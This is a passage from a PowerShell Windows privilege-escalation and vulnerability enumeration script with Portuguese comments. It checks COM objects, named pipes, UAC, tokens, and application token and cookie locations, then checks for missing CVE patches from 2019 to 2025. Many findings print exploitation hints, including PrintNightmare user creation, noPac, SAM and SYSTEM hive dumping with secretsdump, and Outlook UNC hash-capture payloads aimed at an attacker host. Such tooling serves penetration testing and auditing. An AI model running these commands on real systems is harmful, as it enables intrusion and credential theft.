            $ls = "$($_.PSPath)\LocalServer32"
            if (Test-Path $ls) {
                $exe = (Get-ItemProperty $ls)."(default)"
                if ($exe) {
                    $ep = if ($exe -match '"') { ($exe -split '"')[1] } else { ($exe -split ' ')[0] }
                    if ($ep -and (Test-Path $ep) -and (Find-WritablePath $ep)) {
                        W-High "COM gravavel: CLSID=$($_.PSChildName) | $ep"
                        $found = $true
                    }
                }
            }
        }
        if (-not $found) { W-Ok "COM objects: sem binario gravavel (300 amostras)" }
    } catch { W-Info "Erro COM: $_" } }

    W-Sub "Named Pipes — impersonation e pipes suspeitos"
    try {
        $pipes = [System.IO.Directory]::GetFiles("\\.\pipe\")
        W-Info "$($pipes.Count) named pipes encontrados"
        # Pipes que permitem impersonation sem autenticacao (nomes de servicos criticos)
        $critPipes = $pipes | Where-Object { $_ -match "sql|admin|priv|system|lsa|sam|wkssvc|srvsvc|ntsvcs|msdtc|netlogon|spoolss|epmapper" }
        $critPipes | ForEach-Object { W-Med "Pipe critico acessivel (possivel impersonation): $_" }
        # Pipes sem prefixo de servico conhecido — podem ser criados por software vulneravel
        $unknownPipes = $pipes | Where-Object { $_ -notmatch "^\\\\\.\\pipe\\(PIPE|lsass|lsarpc|samr|netlogon|wkssvc|srvsvc|winreg|spoolss|epmapper|IPCPATH|ntsvcs|eventlog|InitShutdown|protected_storage|seclogon|scerpc|browser|drsuapi|netdfs)" } |
                        Select-Object -First 10
        if ($unknownPipes) {
            W-Info "Outros pipes (primeiros 10):"
            $unknownPipes | ForEach-Object { W-Data $_ }
        }
    } catch { W-Info "Erro pipes: $_" }

    W-Sub "Registro — UAC e politicas"
    try {
        $uac = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction Stop).EnableLUA
        if ($uac -eq 0) { W-Crit "UAC DESATIVADO!" }
        else            { W-Ok "UAC ativo (EnableLUA=$uac)" }
    } catch { W-Med "UAC: nao foi possivel verificar EnableLUA" }

    try {
        $consentPrompt = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -ErrorAction Stop).ConsentPromptBehaviorAdmin
        if ($consentPrompt -eq 0) { W-High "ConsentPromptBehaviorAdmin=0 — UAC nunca pede confirmacao para admins" }
    } catch {}

    W-Sub "Tokens de acesso — grupos de alto privilegio"
    try {
        $groups = whoami /groups 2>&1
        @("S-1-5-32-544","S-1-5-18","Domain Admins","Enterprise Admins","Schema Admins","Backup Operators","Print Operators") |
        ForEach-Object {
            if ($groups -match $_) { W-High "Token: membro de grupo privilegiado: $_" }
        }
    } catch {}

    W-Sub "Tokens de aplicacoes (Teams/Slack/Outlook)"
    $tokenPaths = @(
        "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb",
        "$env:APPDATA\Microsoft\Teams\Cookies",
        "$env:APPDATA\Slack\storage",
        "$env:LOCALAPPDATA\Microsoft\Office\16.0\Lync\sip_*\main.db",
        "$env:APPDATA\Microsoft\Protect"
    )
    foreach ($tp in $tokenPaths) {
        try {
            $items = Get-ChildItem $tp -Recurse -ErrorAction Stop -Force | Where-Object { $_.Length -gt 0 }
            if ($items) {
                W-High "Tokens/dados de aplicacao encontrados: $tp ($($items.Count) arquivos)"
            }
        } catch {}
    }
    # Cookies do Edge/Chrome que podem conter tokens SSO
    $browserCookieDirs = @(
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
    )
    foreach ($cd in $browserCookieDirs) {
        if (Test-Path $cd) { W-Med "Cookies de navegador acessiveis (tokens SSO/SAML): $cd" }
    }
}

# ─── CVE CHECKS ──────────────────────────────────────────────────────────────
function Invoke-CVEChecks {
    W-Sec "CVE — Vulnerabilidades Conhecidas (2019-2026)"

    # Coleta build do OS e KBs instalados uma vez
    $osBuild = 0
    try { $osBuild = [int]((Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).BuildNumber) } catch {}
    $hotfixes = @()
    try { $hotfixes = @((Get-HotFix -ErrorAction Stop).HotFixID) } catch {}
    $hkSet = [System.Collections.Generic.HashSet[string]]$hotfixes   # O(1) lookup
    $inDomain = $false
    try { $inDomain = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).PartOfDomain } catch {}

    # Guard: se build nao detectado (0), pular checks dependentes de build — evita falso positivo
    $buildKnown = ($osBuild -gt 0)

    # ── 2019 ─────────────────────────────────────────────────────────────────
    W-Sub "2019 — BlueKeep (RDP RCE pre-auth)"
    # BlueKeep: somente Windows 7 (7601) e Server 2008 (6001-6003) — Win8+ NAO afetado
    if ($buildKnown -and $osBuild -in @(6001,6002,6003,7601)) {
        $rdpOn = try { (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -EA Stop).fDenyTSConnections -eq 0 } catch { $true }
        if ($rdpOn -and -not $hkSet.Contains("KB4499175") -and -not $hkSet.Contains("KB4499167") -and -not $hkSet.Contains("KB4499149")) {
            W-Crit "CVE-2019-0708 (BlueKeep) — Build $osBuild + RDP ativo + sem patch — RCE pre-auth unauthenticated via RDP"
            W-Hint "msfconsole -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <target>; run'"
        } else { W-Ok "CVE-2019-0708 (BlueKeep): RDP desabilitado ou patch aplicado" }
    } elseif ($buildKnown) {
        W-Ok "CVE-2019-0708 (BlueKeep): build $osBuild nao afetado (somente Win7 / Server 2008)"
    }

    # ── 2020 ─────────────────────────────────────────────────────────────────
    W-Sub "2020 — SMBGhost / Zerologon"
    # SMBGhost: somente Win10 1903/1909 (builds 18362/18363) — NAO afeta outros builds
    if ($buildKnown -and $osBuild -in @(18362,18363) -and -not $hkSet.Contains("KB4551762")) {
        W-Crit "CVE-2020-0796 (SMBGhost) — Build $osBuild sem KB4551762 — RCE pre-auth via SMBv3 compressao"
        W-Hint "nmap -p445 --script smb-vuln-ms17-010  |  python3 CVE-2020-0796.py <target>"
    } elseif ($buildKnown -and $osBuild -notin @(18362,18363)) {
        W-Ok "CVE-2020-0796 (SMBGhost): build $osBuild nao afetado"
    }
    # Zerologon: afeta todos os DCs com Windows Server 2008-2019
    if ($buildKnown -and $inDomain -and -not $hkSet.Contains("KB4571694") -and -not $hkSet.Contains("KB4565351") -and -not $hkSet.Contains("KB4571723")) {
        W-Crit "CVE-2020-1472 (Zerologon) — patch nao encontrado — reset de senha de DC via Netlogon sem credenciais"
        W-Hint "python3 zerologon_tester.py <DC_netbios> <DC_ip>"
    }

    # ── 2021 ─────────────────────────────────────────────────────────────────
    W-Sub "2021 — PrintNightmare / InstallerFileTakeOver / noPac / HiveNightmare"
    try {
        $spooler = Get-Service -Name Spooler -ErrorAction Stop
        if ($spooler.Status -eq "Running") {
            if ($buildKnown -and -not $hkSet.Contains("KB5004945") -and -not $hkSet.Contains("KB5004946") -and -not $hkSet.Contains("KB5004947")) {
                W-Crit "CVE-2021-34527 (PrintNightmare) — Spooler ATIVO + KB5004945 ausente — LPE/RCE"
                W-Hint "Invoke-Nightmare -NewUser hacker -NewPassword Pass123! || SharpPrintNightmare"
            }
        } else { W-Ok "Spooler parado — PrintNightmare mitigado" }
    } catch {}

    # InstallerFileTakeOver: Win10 (builds < 22000), NAO afeta Win11/Server 2022+
    if ($buildKnown -and $osBuild -lt 22000 -and -not $hkSet.Contains("KB5007186") -and -not $hkSet.Contains("KB5007189")) {
        W-High "CVE-2021-41379 (InstallerFileTakeOver) — KB5007186 ausente — LPE via MSI rollback"
        W-Hint "InstallerFileTakeOver.exe"
    }

    if ($inDomain) {
        try {
            $s = [adsisearcher]"(objectClass=domainDNS)"
            $s.PropertiesToLoad.Add("ms-DS-MachineAccountQuota") | Out-Null
            $r = $s.FindOne()
            if ($r) {
                $quota = [int]($r.Properties["ms-DS-MachineAccountQuota"][0])
                if ($quota -gt 0 -and $buildKnown -and -not $hkSet.Contains("KB5008380") -and -not $hkSet.Contains("KB5008602")) {
                    W-Crit "CVE-2021-42278/42287 (noPac) — MachineAccountQuota=$quota + patch ausente — Privesc ate Domain Admin"
                    W-Hint "noPac.exe scan -domain <dom> -user <u> -pass <p>  ||  noPac.exe -domain ... -mAccount hack -mPassword P@ss"
                }
            }
        } catch {}
    }

    # CVE-2021-36934 (HiveNightmare/SeriousSAM): builds 17763-19043 (Win10 1809 ate 21H1)
    if ($buildKnown -and $osBuild -ge 17763 -and $osBuild -le 19043) {
        if (-not $hkSet.Contains("KB5004569") -and -not $hkSet.Contains("KB5004570")) {
            W-Crit "CVE-2021-36934 (HiveNightmare/SeriousSAM) — Build $osBuild sem KB5004569 — SAM legivel por usuario comum"
            W-Hint "reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\sys.hive && impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
        }
    }
    # CVE-2021-40449 (Win32k EoP — explorado pelo APT MysterySnail): builds < 22000
    if ($buildKnown -and $osBuild -lt 22000 -and -not $hkSet.Contains("KB5006674") -and -not $hkSet.Contains("KB5006670")) {
        W-High "CVE-2021-40449 (Win32k CallNtUserImeStrokeInfo EoP) — KB5006674 ausente — explorado pelo APT MysterySnail (out/2021)"
    }

    # ── 2022 ─────────────────────────────────────────────────────────────────
    W-Sub "2022 — Certifried / CLFS / Follina / Win32k"
    if ($buildKnown -and $inDomain -and -not $hkSet.Contains("KB5014754")) {
        W-High "CVE-2022-26923 (Certifried) — KB5014754 ausente — LPE via ADCS spoofing de dNSHostName"
        W-Hint "Certify.exe find /vulnerable  ||  certipy account update -user <m$> -dns <DC_FQDN>"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5017308") -and -not $hkSet.Contains("KB5017315")) {
        W-High "CVE-2022-37969 (CLFS EoP) — KB5017308 ausente — LPE via Common Log File System Driver"
    }
    # CVE-2022-21882 (Win32k EoP — bypass de CVE-2021-1732): jan/2022
    if ($buildKnown -and -not $hkSet.Contains("KB5009563") -and -not $hkSet.Contains("KB5009566")) {
        W-High "CVE-2022-21882 (Win32k EoP) — KB5009563 ausente — bypass de mitigacao CVE-2021-1732 via NtUserSetWindowFeedbackSetting"
    }
    # CVE-2022-30190 (Follina/MSDT RCE): jun/2022 — requer msdt.exe presente
    if ($buildKnown -and (Test-Path "C:\Windows\System32\msdt.exe") -and -not $hkSet.Contains("KB5014699") -and -not $hkSet.Contains("KB5014697")) {
        W-Crit "CVE-2022-30190 (Follina/MSDT RCE) — msdt.exe presente + KB5014699 ausente — RCE via ms-msdt:// em documentos Office"
        W-Hint "Dropar .docx com link ms-msdt:// — executa cmd sem abrir msdt visualmente (explorado in-the-wild)"
    }

    # ── 2023 ─────────────────────────────────────────────────────────────────
    W-Sub "2023 — Outlook NTLM / CLFS / Streaming / MSMQ"
    $outlookFound = @(
        "$env:ProgramFiles\Microsoft Office\root\Office16\OUTLOOK.EXE",
        "${env:ProgramFiles(x86)}\Microsoft Office\root\Office16\OUTLOOK.EXE"
    ) | Where-Object { Test-Path $_ }
    if ($outlookFound -and -not $hkSet.Contains("KB5002254")) {
        W-High "CVE-2023-23397 (Outlook NTLM relay) — Outlook instalado + KB5002254 ausente"
        W-Hint "Enviar e-mail com UNC path no campo reminder: \\\\<attacker>\\x — hash capturado via Responder"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5025221") -and -not $hkSet.Contains("KB5025224")) {
        W-High "CVE-2023-28252 (CLFS EoP) — KB5025221 ausente — explorado in-the-wild por ransomware Nokoyawa"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5031361") -and -not $hkSet.Contains("KB5031354")) {
        W-High "CVE-2023-36802 (Streaming Service Proxy EoP) — KB5031361 ausente — 0-day explorado in-the-wild"
    }
    # CVE-2023-21554 (MSMQ QueueJumper RCE): abr/2023 — requer MSMQ rodando na porta 1801
    $msmqSvc = try { Get-Service -Name MSMQ -ErrorAction Stop } catch { $null }
    if ($msmqSvc -and $msmqSvc.Status -eq "Running" -and $buildKnown -and -not $hkSet.Contains("KB5025221") -and -not $hkSet.Contains("KB5025224")) {
        W-Crit "CVE-2023-21554 (MSMQ QueueJumper RCE) — MSMQ rodando + KB5025221 ausente — RCE unauthenticated via porta 1801"
        W-Hint "nc -zv <target> 1801  &&  python3 CVE-2023-21554.py <target>"
    }

    # ── 2024 ─────────────────────────────────────────────────────────────────
    W-Sub "2024 — appid.sys / WER / CSC / Kernel / AFD / MMC"
    if ($buildKnown -and -not $hkSet.Contains("KB5034441") -and -not $hkSet.Contains("KB5034440")) {
        W-High "CVE-2024-21338 (appid.sys WDAC bypass LPE) — KB5034441 ausente"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5035849") -and -not $hkSet.Contains("KB5035853")) {
        W-High "CVE-2024-26169 (Windows Error Reporting EoP) — KB5035849 ausente"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5037765") -and -not $hkSet.Contains("KB5037771")) {
        W-High "CVE-2024-26229 (CSC Driver EoP) — KB5037765 ausente"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5039212") -and -not $hkSet.Contains("KB5039211")) {
        W-High "CVE-2024-30088 (Kernel EoP via NTFS) — KB5039212 ausente"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5041571") -and -not $hkSet.Contains("KB5041578")) {
        W-Crit "CVE-2024-38193 (AFD.sys EoP) — KB5041571 ausente — explorado pelo APT Lazarus (agosto 2024)"
        W-Hint "PoC publico disponivel — LPE de usuario comum para SYSTEM via AFD driver"
    }
    # CVE-2024-21413 (Outlook Moniker Link RCE): fev/2024 — requer Outlook instalado
    if ($outlookFound -and -not $hkSet.Contains("KB5002543") -and -not $hkSet.Contains("KB5002537")) {
        W-Crit "CVE-2024-21413 (Outlook Moniker Link RCE) — Outlook + KB5002543 ausente — RCE via .msg com hyperlink moniker (bypass Protected View)"
        W-Hint "Enviar .msg com link file:///<attacker>/<payload> — Preview pane e suficiente para explorar"
    }
    # CVE-2024-43572 (MMC MSC EvilTwin — 0-day explorado in-the-wild): out/2024
    if ($buildKnown -and -not $hkSet.Contains("KB5044280") -and -not $hkSet.Contains("KB5044273")) {
        W-High "CVE-2024-43572 (MMC MSC EvilTwin) — KB5044280 ausente — LPE via arquivo .msc malicioso explorado in-the-wild (out/2024)"
        W-Hint "Dropar arquivo .msc forjado — constranger snap-in legítimo via CLSID substituido para carregar DLL arbitraria"
    }
    # CVE-2024-49039 (Windows Task Scheduler EoP — APT RomCom): nov/2024
    if ($buildKnown -and -not $hkSet.Contains("KB5046617") -and -not $hkSet.Contains("KB5046613")) {
        W-High "CVE-2024-49039 (Task Scheduler EoP) — KB5046617 ausente — escalada de AppContainer para Medium Integrity (RomCom, out/2024)"
        W-Hint "Explorado em conjunto com CVE-2024-49040 — LPE de baixa integridade para escopo sistema"
    }

    # ── 2025 ─────────────────────────────────────────────────────────────────
    W-Sub "2025 — AFD EoP / NTLM / CLFS / Hyper-V / MMC"
    if ($buildKnown -and -not $hkSet.Contains("KB5050009") -and -not $hkSet.Contains("KB5050021")) {
        W-Crit "CVE-2025-21418 (AFD.sys EoP) — KB5050009 ausente — explorado in-the-wild (jan/2025)"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5054979") -and -not $hkSet.Contains("KB5055523")) {
        W-High "CVE-2025-24054 (NTLM hash leak via .library-ms) — KB5054979 ausente — explorado in-the-wild (mar/2025)"
        W-Hint "Colocar arquivo .library-ms em share — hash NTLM capturado ao navegar pela pasta"
    }
    if ($buildKnown -and -not $hkSet.Contains("KB5055523") -and -not $hkSet.Contains("KB5055519")) {
        W-Crit "CVE-2025-29824 (CLFS EoP) — KB5055523 ausente — vetor de ransomware RansomEXX / Storm-2460 (abr/2025)"
    }
    # CVE-2025-21333 (Hyper-V NT Kernel Integration VSP EoP — 0-day jan/2025)
    $hvRunning = try { (Get-Service -Name vmms -ErrorAction Stop).Status -eq "Running" } catch { $false }
    if ($hvRunning -and $buildKnown -and -not $hkSet.Contains("KB5049981") -and -not $hkSet.Contains("KB5049993")) {
        W-Crit "CVE-2025-21333 (Hyper-V NT Kernel VSP EoP) — Hyper-V ativo + KB5049981 ausente — LPE explorado in-the-wild (jan/2025)"
        W-Hint "Requer Hyper-V habilitado — escalada via NT Kernel Integration VSP sem privilegios adicionais"
    }
    # CVE-2025-26633 (MMC bypass 0-day — operacao Storm-2460 / Water Gamayun): mar/2025
    if ($buildKnown -and -not $hkSet.Contains("KB5053598") -and -not $hkSet.Contains("KB5053606")) {
        W-High "CVE-2025-26633 (MMC bypass 0-day) — KB5053598 ausente — UAC bypass via MSC malicioso explorado pelo TA569 / Water Gamayun (mar/2025)"
        W-Hint "Dropar arquivo .msc malicioso — escalada silenciosa via MMC sem prompt de UAC"
    }

    W-Sub "Resumo de patches"
    Write-Host ""
    Write-Host ("  [INFO] Hotfixes instalados: {0} | Build OS: {1}" -f $hotfixes.Count, $osBuild) -ForegroundColor DarkGray
}

# ─── MAIN ─────────────────────────────────────────────────────────────────────

W-Banner

switch ($Module) {
    "System"     { Invoke-SystemChecks }
    "Network"    { Invoke-NetworkChecks }
    "Services"   { Invoke-ServicesChecks }
    "Creds"      { Invoke-CredsChecks }
    "ADCS"       { Invoke-ADCSChecks }
    "AD"         { Invoke-ADChecks }
    "Containers" { Invoke-ContainersChecks }
    "Modern"     { Invoke-ModernChecks }
    "CVE"        { Invoke-CVEChecks }
    "All" {
        # Execucao sequencial garante contadores consolidados no resumo executivo
        Invoke-SystemChecks
        Invoke-ServicesChecks
        Invoke-NetworkChecks
        Invoke-CredsChecks
        Invoke-ADCSChecks
        Invoke-ADChecks
        Invoke-ContainersChecks
        Invoke-ModernChecks
        Invoke-CVEChecks
    }
}

W-SubFlush   # exibe contagem do ultimo sub

$W = 70; $line = "=" * $W
Write-Host ""
Write-Host "  $line" -ForegroundColor DarkCyan
Write-Host ("  Scan concluido em: {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor Cyan
Write-Host "  $line" -ForegroundColor DarkCyan
Write-Host ""

# ─── RESUMO EXECUTIVO ────────────────────────────────────────────────────────
$totalFindings = $script:CountCrit + $script:CountHigh + $script:CountMed
Write-Host ""
Write-Host "  $line" -ForegroundColor DarkCyan
Write-Host "  RESUMO EXECUTIVO" -ForegroundColor Cyan
Write-Host "  $line" -ForegroundColor DarkCyan
Write-Host ""

# Barra visual de severidade
$barTotal = [math]::Max($totalFindings, 1)
$cBar = [math]::Round(($script:CountCrit / $barTotal) * 30)
$hBar = [math]::Round(($script:CountHigh / $barTotal) * 30)
$mBar = $barTotal - $cBar - $hBar
Write-Host ("  {0,-10} {1,3}   {2}" -f "CRITICAL:",$script:CountCrit,("*" * $cBar)) -ForegroundColor Red
Write-Host ("  {0,-10} {1,3}   {2}" -f "HIGH:",    $script:CountHigh,("*" * $hBar)) -ForegroundColor Yellow
Write-Host ("  {0,-10} {1,3}   {2}" -f "MEDIUM:",  $script:CountMed, ("*" * [math]::Max($mBar,0))) -ForegroundColor Magenta
Write-Host ("  {0,-10} {1,3}" -f "TOTAL:", $totalFindings) -ForegroundColor Cyan
Write-Host ""

# Findings agrupados por secao
if ($totalFindings -gt 0) {
    $sections = $script:Findings | Group-Object Section | Sort-Object {
        switch ($_.Name) { "CVE"{0} "SISTEMA"{1} "SERVICOS"{2} "AD"{3} "ADCS"{4} default{5} }
    }
    foreach ($sec in $sections) {
        $critC = ($sec.Group | Where-Object { $_.Severity -eq "CRITICAL" }).Count
        $highC = ($sec.Group | Where-Object { $_.Severity -eq "HIGH"     }).Count
        $medC  = ($sec.Group | Where-Object { $_.Severity -eq "MEDIUM"   }).Count
        $tag   = ""
        if ($critC -gt 0) { $tag += " ${critC}xCRIT" }
        if ($highC -gt 0) { $tag += " ${highC}xHIGH" }
        if ($medC  -gt 0) { $tag += " ${medC}xMED"  }
        Write-Host ("  {0,-20} {1}" -f $sec.Name,$tag.Trim()) -ForegroundColor DarkCyan
        $sec.Group | Where-Object { $_.Severity -in @("CRITICAL","HIGH") } | ForEach-Object {
            $col = if ($_.Severity -eq "CRITICAL") { "Red" } else { "Yellow" }
            $label = if ($_.Severity -eq "CRITICAL") { "[CRIT]" } else { "[HIGH]" }
            $msg = if ($_.Message.Length -gt 80) { $_.Message.Substring(0,77) + "..." } else { $_.Message }
            Write-Host ("    {0} {1}" -f $label,$msg) -ForegroundColor $col
        }
    }
    Write-Host ""
}

# Proximos passos
if ($script:CountCrit -gt 0 -or $script:CountHigh -gt 0) {
    Write-Host "  PROXIMOS PASSOS RECOMENDADOS:" -ForegroundColor Cyan
    $script:Findings | Where-Object { $_.Severity -eq "CRITICAL" } | Select-Object -First 3 | ForEach-Object {
        Write-Host ("    -> {0}" -f $_.Check) -ForegroundColor Red
    }
    Write-Host ""
}
Write-Host "  $line" -ForegroundColor DarkCyan
Write-Host ""

# ─── SAIDA ESTRUTURADA ───────────────────────────────────────────────────────
if ($OutputFormat -eq "Json" -or $OutputFormat -eq "Csv") {
    $data = $script:Findings | ForEach-Object {
        [PSCustomObject]@{
            Severity  = $_.Severity
            Section   = $_.Section
            Check     = $_.Check
            Message   = $_.Message
            Timestamp = $_.Timestamp
        }
    }
    if ($OutputFormat -eq "Json") {
        $json = $data | ConvertTo-Json -Depth 3
        if ($OutputFile -ne "") { $json | Out-File -FilePath $OutputFile -Encoding UTF8; Write-Host "  JSON: $OutputFile" -ForegroundColor Green }
        else                    { $json }
    } elseif ($OutputFormat -eq "Csv") {
        if ($OutputFile -ne "") { $data | Export-Csv -Path $OutputFile -NoTypeInformation -Encoding UTF8; Write-Host "  CSV: $OutputFile" -ForegroundColor Green }
        else                    { $data | ConvertTo-Csv -NoTypeInformation }
    }
} elseif ($OutputFile -ne "") {
    try { Stop-Transcript | Out-Null } catch {}
    Write-Host "  Output: $OutputFile" -ForegroundColor Green
}
